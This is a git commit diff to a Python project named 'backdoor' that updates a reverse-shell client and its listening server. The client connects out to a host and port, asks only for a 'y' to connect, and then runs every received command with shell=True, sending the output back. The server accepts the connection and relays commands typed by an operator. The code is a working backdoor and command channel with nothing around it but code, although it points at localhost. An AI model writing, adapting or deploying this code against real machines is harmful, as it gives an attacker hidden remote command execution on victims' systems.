35f5175a43125c7494411c6fcb0937687f0cbfa9
kevintxy <ktaha@purdue.edu>
2019-02-04 23:46:00 -0500

    new sections

--- python/backdoor.py
+++ python/backdoor.py
@@ -1,25 +1,28 @@
 #!/usr/bin/python
 import subprocess
+import os
 import socket
 
 host = "127.0.0.1"
-port = 3000
-passwd = "secret"
+port = 9999
 
 def Login():
     global s
-    s.send("Login:  ")
-    pwd = s.recv(1024)
+    s.send("Found Client: Connect? (y/n): ".encode())
+    pwd = s.recv(1024).decode()
 
-    if pwd.strip() != passwd:
+    if pwd.strip() != "y":
         Login()
     else:
-        s.send("Conntected #> ")
+        s.send("Connected #> ".encode())
         Shell()
 
 def Shell():
     while True:
-        data = s.recv(1024)
+        data = s.recv(1024).decode()
+
+        if data[:2] == 'cd':
+            os.chdir(data[3:].rstrip("\n"))
 
         if data.strip() == ":kill:":
             break
@@ -27,7 +30,7 @@ def Shell():
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output = proc.stdout.read() + proc.stderr.read()
         s.send(output)
-        s.send("#>")
+        s.send("#>".encode())
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host,port))
--- python/server.py
+++ python/server.py
@@ -1,18 +1,59 @@
-#!/usr/bin/env python3
-
 import socket
+import sys
 
-HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
-PORT = 3000        # Port to listen on (non-privileged ports are > 1023)
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.bind((HOST, PORT))
-    s.listen()
-    conn, addr = s.accept()
-    with conn:
-        print('Connected by', addr)
-        while True:
-            data = conn.recv(1024)
-            if not data:
-                break
-            conn.sendall(data)
+#  Create socket (allows two computers to connect)
+def socket_create():
+    try:
+        global host
+        global port
+        global s
+        host = ''  # the server doesn't need to know the ip, only the client
+        port = 9999
+        s = socket.socket()
+    except socket.error as msg:
+        print('Socket creation error', str(msg))
+
+
+# Bind socket to port and wait for connection from client
+def socket_bind():
+    try:
+        global host
+        global port
+        global s
+        print('Binding socket to port: ' + str(port))
+        s.bind((host, port))
+        s.listen(5)
+    except socket.error as msg:
+        print('Socket binding error', str(msg) + '\n' + 'Retrying...')
+        socket_bind()
+
+
+# Establish a connection with client (socket must be listening for them)
+def socket_accept():
+    conn, address = s.accept()
+    print('Connection has been established | ' + 'IP ' + address[0] + ' | Port ' + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+
+#  Send commands
+def send_commands(conn):
+    while True:
+        cmd = input('')
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:  # system commands are bytes and not strings
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), 'utf-8')
+            print(client_response, end='')
+
+
+def main():
+    socket_create()
+    socket_bind()
+    socket_accept()
+
+main()
